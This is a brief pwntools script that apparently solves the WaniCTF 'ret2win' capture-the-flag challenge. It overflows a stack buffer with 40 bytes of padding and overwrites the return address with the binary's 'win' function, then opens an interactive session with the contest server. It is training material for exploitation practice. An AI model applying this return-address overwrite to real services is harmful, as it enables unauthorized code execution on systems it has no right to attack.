from pwn import *
import sys

elf = ELF("chall")

# io = process(elf.path)
io = remote("ret2win-pwn.wanictf.org", 9003)

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h", "-F" "#{pane_pid}", "-P"]

p = b"A" * 40
p += p64(elf.sym["win"])
io.send(p)

io.interactive()
